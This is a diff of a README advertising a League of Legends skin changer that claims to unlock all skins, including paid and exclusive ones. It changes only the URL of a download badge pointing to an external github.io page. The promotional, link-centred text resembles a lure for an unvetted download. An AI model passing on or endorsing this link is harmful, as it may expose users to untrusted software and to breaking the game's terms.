@@ -2,7 +2,7 @@
 
 Take your League of Legends gameplay to the next level with this advanced Skin Changer, built in C++/C#. Unlock any skin you desire, customize your champions, and create a truly unique experience. Whether you want to stand out in the battlefield or enjoy new looks for your favorite champions, this tool provides seamless integration and an easy-to-use interface. Play your game the way you’ve always wanted, with a huge variety of skins, and enjoy your customized experience without any hassle.
 
-[![Download League of Legends Skin Changer](https://img.shields.io/badge/Download-LOL%20Skin%20Changer-blueviolet)](https://league-of-legends-skin-changer-v2.github.io/.github/)
+[![Download League of Legends Skin Changer](https://img.shields.io/badge/Download-LOL%20Skin%20Changer-blueviolet)](https://league-of-legends-skin-changer-v2.github.io/.github)
 
 ## Key Features 🎯  
 - **Unlock All Skins**: Access all skins in League of Legends, including exclusive and limited-edition skins.  
